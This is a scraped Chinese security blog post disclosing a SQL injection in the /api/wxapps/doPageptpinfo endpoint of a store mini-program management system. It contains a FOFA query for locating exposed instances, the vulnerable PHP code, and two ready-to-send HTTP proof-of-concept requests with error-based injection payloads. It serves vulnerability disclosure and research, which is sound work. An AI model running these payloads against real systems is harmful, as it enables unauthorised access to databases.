---
title: "万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞"
source: https://mrxn.net/jswz/api-wxapps-doPageptpinfo-sqli.html
asset_dir: assets/万能门店小程序管理系统-apiwxappsdopageptpinfo-sql-注入漏洞
---

# 万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/2/15 18:17
* 469浏览
* [0评论](#comment)
* 20分钟阅读

深入探索

授权

网络安全会议

VPN服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

万能门店小程序管理系统是一款功能强大的工具，旨在为各行业商家提供线上线下融合的全方位解决方案。是一个集成了会员管理和会员营销两大核心功能的综合性平台。它支持多行业使用，通过后台一键切换版本，满足不同行业商家的个性化需求。该系统采用轻量后台，搭载高效服务器，确保小程序运行流畅，提升用户体验。万能门店小程序管理系统 /api/wxapps/doPageptpinfo 存在 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者可通过该漏洞获取数据库中的敏感信息，甚至可能进一步控制服务器。

SQL注入检测工具

# 影响版本

万能门店小程序全开源独立版V5.2.0

# fofa语法

> `body="/new_plat/index.html#/login" || (body="/comhome/cases/index.html" && body="/Comhome/functionshow/index.html")`

# 漏洞分析

application/api/controller/Wxapps.php

```
//拼团数据自己规格
    public function doPageptpinfo()
    {
        $uniacid = input("uniacid");
        $str = input("str");
        $types = input("types");
        $id = input("id");
        $arr = explode("/", $str);
        $where = "";
        foreach ($arr as $key => &$res) {
            $vv = $key + 1;
            $where .= " and type" . $vv . " = " . "'" . $res . "'";
        }
        $prefix = config('database.prefix');
        $proinfo = Db::query("SELECT * FROM {$prefix}wd_xcx_pt_pro_val WHERE pid = " . $id . $where . " limit 1");
        $baseinfo = Db::name('wd_xcx_pt_pro')->where('id', $id)->find();
        if ($baseinfo['thumb']) {
            $baseinfo['thumb'] = remote($uniacid, $baseinfo['thumb'], 1);
        }
        $adata['proinfo'] = $proinfo[0];
        if ($adata['proinfo']['thumb']) {
            $adata['proinfo']['thumb'] = remote($uniacid, $adata['proinfo']['thumb'], 1);
        }
        $adata['baseinfo'] = $baseinfo;
        $result['data'] = $adata;
        return json_encode($result);
    }
```

* **id 参数**： 该参数未作任何过滤或转义，直接作为 SQL 中 pid 的值拼接,造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。
* **str 参数中的各个分割后子串**： $str 经 explode("/") 拆分后，每个部分都以 “and type{n} = '用户输入'” 的形式拼接到 SQL 语句中,造成SQL注入漏洞。

# 漏洞复现

深入探索

编程语言教程

物流软件安全

文件大小转换

```
POST /api/wxapps/doPageptpinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

id=1+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23
```

[![万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞](images/img-001-a921769cb282.webp)](https://image.mrxn.net/ce17adb605b646ffb521c7f9a514f4eb.webp)

```
POST /api/wxapps/doPageptpinfo HTTP/1.1
Host: wxapps.mrxn.net
Content-Type: application/x-www-form-urlencoded

str=a'+AND+GTID_SUBSET(CONCAT((SELECT(md5(123456)))),3119)%23/b
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[万能门店小程序管理系统 /api/wxapps/doPageptpinfo SQL 注入漏洞](https://mrxn.net/jswz/api-wxapps-doPageptpinfo-sqli.html)  
文章链接：<https://mrxn.net/jswz/api-wxapps-doPageptpinfo-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

代码安全审计

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-doPageptpinfo-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞扫描服务

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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